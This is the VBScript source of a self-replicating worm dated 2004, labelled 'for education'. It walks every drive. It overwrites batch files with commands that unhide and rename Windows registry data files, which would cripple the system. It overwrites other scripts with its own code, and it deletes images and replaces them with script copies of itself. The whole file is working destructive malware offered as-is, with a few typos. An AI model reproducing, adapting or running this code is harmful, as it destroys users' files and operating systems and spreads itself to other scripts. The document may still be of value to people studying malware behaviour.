'w0rm.fUcKmYLifE cReate by Spidey@21 aPriL 2004
'BatAntiSystem ...........................
'PurPOse foR eDucaTioN
on error resume next
set fso=createobject("scripting.filesystemobject")
set worm=fso.opentextfile(wscript.scriptfullname, 1)
doe=worm.readall
set shell=createobject("WScript.Shell")
out=shell.regread("hcku\software\microsoft\windows scripting host\settings\timeout")
if (out>=1) Then
shell.regwrite "hkcu\software\microsoft\windows scripting host\settings\timeout", 1, "reg_dword"
end if
set drives=fso.drives
  for each drive in drives
  if drive.isready then
  find drive & "\"
  end if
next
sub find(myown)
on error resume next
set eker=fso.getfolder(myown)
for each bejat in eker.files
ps=fso.getextensionname(bejat.path)
  if (ps="bat") then
  on error resume next
  set infect=fso.createtextfile(bejat.path, true)
  infect.writeline "@cd\windows"
  infect.writeline "@attrib -s -h -r *.dat"
  infect.writeline "@attrib -s -h -r *.da0"
  infect.writeline "@cd\"
  infect.writeline "@attrib -s -h -r *.1st"
  infect.writeline "@cd\WINDOWS"
  infect.writeline "@ren system.dat system.taek"
  infect.writeline "@ren User.da0 User.cui"
  infect.writeline "@ren system.st system.hee"
  infect.writeline "@cd\"
  infect.writeline "@ren system.st system.cox"
  infect.close
  elseif (ps="vbs") or (ps="vbe") then
  on error resume next
  set infect=fso.createtextfile(bejat.path,true)
  infect.write doe
  infect.close
  set coplak=fso.getfile(bejat.path)
  coplah.copy(bejat.path)
  elseif(ps="jpg") or (ext="jpeg") or (ext="gif") or (ext="bmp") or (ext="pmb") or (ext="tif") or (ext="tiff") or (ext="pic") or (ext="emf") then
  set ja=fso.createtextfile(bejat.path&".vbs")
  fso.deletefile(bejat.path)
  ja.write doe
  ja.close
  '
end if
next
for each ulang in eker.subfolders
find(ulang.path)
next
end sub
'PurPOse foR eDucaTioN
